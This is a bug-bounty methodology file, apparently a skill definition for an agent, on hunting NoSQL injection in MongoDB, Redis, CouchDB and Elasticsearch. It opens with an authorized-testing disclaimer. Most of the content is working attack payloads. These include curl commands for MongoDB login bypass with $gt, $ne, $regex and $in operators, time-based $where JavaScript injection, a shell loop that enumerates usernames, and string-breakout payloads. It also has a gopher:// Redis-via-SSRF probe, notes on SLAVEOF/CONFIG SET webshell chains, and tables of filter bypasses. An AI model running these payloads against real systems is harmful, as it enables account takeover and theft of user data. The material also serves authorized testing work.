---
name: hunt-nosqli
description: Hunt NoSQL Injection — MongoDB operator injection ($where, $regex, $gt, $ne), CouchDB, Redis command injection, auth bypass via NoSQLi, data dump. Use when target uses MongoDB/Mongoose, CouchDB, Redis, or shows NoSQL error messages.
metadata:
  sources: hackerone_public
  report_count: 14
---

> Authorized testing only: run this against assets you own or that a signed scope or a program's in-scope list names. It is a find-and-report methodology, not a weapon.

# HUNT-NOSQLI — NoSQL Injection

## Crown Jewel Targets

NoSQL injection is most valuable when it bypasses authentication (Critical) or leaks the entire user collection (High).

**Highest-value chains:**
- **MongoDB auth bypass** — `{"username": {"$gt": ""}, "password": {"$gt": ""}}` logs in as first user in collection (usually admin)
- **$where JS injection** — if $where is enabled: blind injection → data exfil
- **Redis command injection** — via SSRF or direct TCP, SLAVEOF attacker-ip → config write → webshell
- **Elasticsearch injection (historical)** — Groovy script injection on `_search` was a pre-5.0 RCE; on a current cluster an open `:9200` is a data-exposure finding, not RCE

---

## Attack Surface Signals

### URL & Param Patterns
```
/api/users/login         POST with JSON body
/api/search?q=
/api/find?filter=
/api/query?where=
Any endpoint accepting JSON body with username/password
```

### Stack Signals
| Signal | Vector |
|--------|--------|
| MongoDB error messages in response | Operator injection |
| mongoose / monk in JS bundles | ODM patterns |
| X-Powered-By: Express | Node.js + MongoDB common stack |
| CouchDB/_utils UI exposed | Futon/Fauxton admin |
| Redis port 6379 open (via SSRF) | CONFIG SET / SLAVEOF |
| Elasticsearch :9200 open | Unauthenticated data access (script RCE only on historical pre-5.0 Groovy) |
| mongoose with user JSON reaching `populate({match})` | `$where` via populate match: CVE-2024-53900 (fixed 8.8.3 / 7.8.3 / 6.13.5 / 5.13.23) and its bypass CVE-2025-23061 (fixed 8.9.5 / 7.8.4 / 6.13.6; no 5.x fix). See `hunt-sqli` Disclosed Report Citation #10 |

---

## Step-by-Step Hunting Methodology

### Phase 1 — Auth Bypass (MongoDB)
```bash
# Operator injection in JSON body
curl -s -X POST https://$TARGET/api/login \
  -H "Content-Type: application/json" \
  -d '{"username": {"$gt": ""}, "password": {"$gt": ""}}'

# Regex wildcard — match any username
curl -s -X POST https://$TARGET/api/login \
  -H "Content-Type: application/json" \
  -d '{"username": {"$regex": ".*"}, "password": {"$regex": ".*"}}'

# ne (not equal) bypass
curl -s -X POST https://$TARGET/api/login \
  -H "Content-Type: application/json" \
  -d '{"username": "admin", "password": {"$ne": "wrong"}}'

# in array bypass
curl -s -X POST https://$TARGET/api/login \
  -H "Content-Type: application/json" \
  -d '{"username": {"$in": ["admin","administrator","root"]}, "password": {"$ne": "x"}}'
```

### Phase 2 — URL Parameter Injection
```bash
# Array notation (Express/PHP-style)
curl "https://$TARGET/api/users?username[$gt]=&password[$gt]="
curl "https://$TARGET/api/search?q[$regex]=.*&q[$options]=i"

# POST form data
curl "https://$TARGET/api/login" \
  --data "username[$gt]=&password[$gt]="
```

### Phase 3 — $where Blind Injection (time-based)
```bash
# Test if $where is enabled (time-based detection, 5s delay)
curl -s -X POST https://$TARGET/api/search \
  -H "Content-Type: application/json" \
  -d '{"q": {"$where": "function(){var d=new Date();while(new Date()-d<5000){}; return true;}"}}'
# If response takes 5+ seconds → $where injection confirmed

# Blind data exfil (username starts with 'a'?)
curl -s -X POST https://$TARGET/api/search \
  -H "Content-Type: application/json" \
  -d '{"q": {"$where": "function(){if(this.username.match(/^a/)){sleep(3000);} return true;}"}}'
```

### Phase 3b — Syntax injection into a concatenated `$where`/query (string context)
When the app concatenates input into a JS `$where` STRING (`"this.name=='"+input+"'"`) instead of accepting an operator object, break the string rather than passing `$gt`/`$ne`. Fuzz first, then break:
```
fuzz:  ' " ` { ; $         # any 500/behaviour change = syntax reaches the query
' || '1'=='1               # always-true (string-context breakout)
' && this.password.match(/^a/) || 'x'=='y   # boolean char-exfil oracle
```
(PortSwigger: Injecting syntax into NoSQL queries.)

### Phase 4 — Data Dump via Regex
```bash
# Enumerate usernames character by character
for c in a b c d e f g h i j k l m n o p q r s t u v w x y z; do
  RESP=$(curl -s -X POST https://$TARGET/api/users \
    -H "Content-Type: application/json" \
    -d "{\"username\": {\"\$regex\": \"^$c\"}}")
  echo "$c: $(echo $RESP | wc -c)"
done
```

### Phase 5 — Manual confirmation with Burp (no maintained automation)
NoSQLMap is Python 2 only (last GitHub release 0.5, 2016), and the PyPI name `nosqlmap` belongs to an unrelated placeholder package, so do not `pip install` it. Work it by hand in Burp Repeater / Comparer:
1. **Baseline** a legitimate value and save the response.
2. **Type juggling:** resend the same parameter as an operator object (`{"$ne":null}`, `param[$ne]=`). A different result set or a login = operator injection. Control: `{"$eq":"<legit value>"}` must match the baseline.
3. **String context:** Phase 3b syntax probes.
4. **Error-based (SensePost, 2025):** with verbose errors, force a type error that echoes a field value, e.g. `{"$expr":{"$toInt":["$username"]}}`; a `$where`-reachable sink can also be made to throw an error carrying the current document. Data appearing in the error body is the proof. <https://sensepost.com/blog/2025/nosql-error-based-injection/>
5. **Pre-condition removal (SensePost, 2025):** when input lands inside a JSON string of a server-built filter, closing the string and repeating a key overrides the earlier clause (last key wins): `","username":{"$ne":""},"$where":"1`. The author found no equivalent for post-conditions. <https://sensepost.com/blog/2025/getting-rid-of-pre-and-post-conditions-in-nosql-injections/>
6. **Aggregation pipelines (Soroush Dalili, 2024):** if input reaches an `aggregate([...])` stage list, `$lookup` / `$unionWith` read other collections. Detect with a harmless stage (`{"$limit":1}`, `{"$count":"x"}`) changing the result shape. Never send `$merge` / `$out`: they write. <https://soroush.me/blog/mongodb-nosql-injection-with-aggregation-pipelines/>
Use Intruder only for the Phase 4 regex walk, in a single-request resource pool with a delay.

### Phase 6 — Redis via SSRF
```bash
# If SSRF found, probe internal Redis via gopher:// (read-only PING; never FLUSHALL on a target)
curl "https://$TARGET/fetch?url=gopher://127.0.0.1:6379/_*1%0d%0a%244%0d%0aPING%0d%0a"

# CONFIG SET webshell (if Redis has write access to web root)
# Use SLAVEOF for OOB data exfil
```

---

## Bypass Table

| Defense | Bypass |
|---------|--------|
| JSON.parse rejects objects | Use array: `password[$ne]=x` (URL params) |
| Sanitizes `$` | Unicode: `$gt` |
| Blocks operator keys | Nested objects deeper in structure |

---

## Chain Table

| NoSQLi finding | Chain to | Impact |
|---------------|----------|--------|
| Auth bypass | Admin panel access | Full admin control |
| User enum via regex | Credential stuffing | Mass ATO |
| $where enabled | Arbitrary JS in DB process | Data exfil or DoS |
| Redis via SSRF | CONFIG SET / SLAVEOF | Webshell or data exfil |

---

## Validation

✅ Auth bypass: logged in without valid credentials, received valid session token
✅ Data dump: returned users/documents you shouldn't have access to
✅ Blind injection: confirmed via time-delay (>4 seconds consistent)

**Severity:**
- Auth bypass as admin: Critical
- User collection dump: High
- Blind injection (no useful exfil): Medium
